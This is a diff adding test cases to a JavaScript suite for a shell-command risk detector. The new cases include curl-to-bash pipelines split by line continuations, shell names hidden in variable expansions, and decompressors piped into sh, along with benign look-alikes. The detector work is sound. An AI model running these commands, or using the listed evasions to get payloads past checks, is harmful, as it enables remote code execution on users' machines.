@@ -238,6 +238,22 @@ for (const [label, cmd, id] of [
   ['hex decode then run', 'echo 6c73 | xxd -r -p | sh', 'cmd-decode-to-shell'],
   ['a stage between the pipe and the shell', 'curl -s https://x.test/p | base64 -d | sh', 'cmd-remote-to-shell'],
   ['eval of a substitution', 'eval "' + SUBST + '"', 'cmd-dynamic-exec'],
+  // Found by red-teaming the fix above. The first two are ordinary README formatting, which made
+  // them the worst of the set: the newline split the fetch and the shell into separate pipelines
+  // and nothing ever compared them.
+  ['a backslash line continuation', 'curl -fsSL https://x.test/i.sh \\\n  | bash', 'cmd-remote-to-shell'],
+  ['a pipeline broken after the pipe', 'curl -fsSL https://x.test/i.sh |\n  bash -s -- --force', 'cmd-remote-to-shell'],
+  ['a default-value expansion', 'curl -sL https://x.test/i.sh | ${UNSET:-bash}', 'cmd-unresolved-exec'],
+  ['an expansion joined to a suffix', 'X=ba; curl -sL https://x.test/i.sh | ${X}sh', 'cmd-remote-to-shell'],
+  ['an unset expansion inside a name', 'curl -sL https://x.test/i.sh | b${Z}ash', 'cmd-unresolved-exec'],
+  ['zcat to a shell', 'zcat payload.gz | bash', 'cmd-decode-to-shell'],
+  ['gzip -dc to a shell', 'gzip -dc payload.gz | bash', 'cmd-decode-to-shell'],
+  ['bzip2 to a shell', 'bzip2 -dc payload.bz2 | sh', 'cmd-decode-to-shell'],
+  ['unzip to stdout', 'unzip -p payload.zip | sh', 'cmd-decode-to-shell'],
+  ['gunzip to a shell', 'gunzip -c payload.gz | sh', 'cmd-decode-to-shell'],
+  ['xz to a shell', 'xz -dc payload.xz | bash', 'cmd-decode-to-shell'],
+  ['zstd to a shell', 'zstd -dc payload.zst | bash', 'cmd-decode-to-shell'],
+  ['tar extracted to stdout', 'tar -xOzf payload.tgz | sh', 'cmd-decode-to-shell'],
 ]) {
   const risky = shellcmd.parse(cmd).risky;
   ck(`catches ${label}`, risky.some((r) => r.id === id), `got ${JSON.stringify(risky.map((r) => r.id))}`);
@@ -259,6 +275,12 @@ for (const [label, cmd] of [
   ['a fetch into a parser', 'curl -sL https://x.test/f.json | jq .'],
   ['openssl encrypting', 'openssl enc -aes-256-cbc -salt -in f -out f.enc'],
   ['sourcing a plain file', 'source ~/.bashrc'],
+  ['compressing rather than decompressing', 'tar -czf backup.tgz src/ && ls -la backup.tgz'],
+  ['reading a compressed log', 'zcat access.log.gz | grep -c error'],
+  ['decompressing to a file', 'gunzip -c archive.gz > archive.txt'],
+  ['extracting an archive normally', 'tar -xzf release.tgz && cd release'],
+  ['a multi-line build with continuations', 'docker build \\\n  --build-arg V=1 \\\n  -t app .'],
+  ['a multi-line pipeline into a parser', 'curl -s https://x.test/f.json |\n  jq -r .version'],
 ]) {
   const risky = shellcmd.parse(cmd).risky;
   ck(`stays quiet on ${label}`, risky.length === 0, `got ${JSON.stringify(risky.map((r) => r.id))}`);
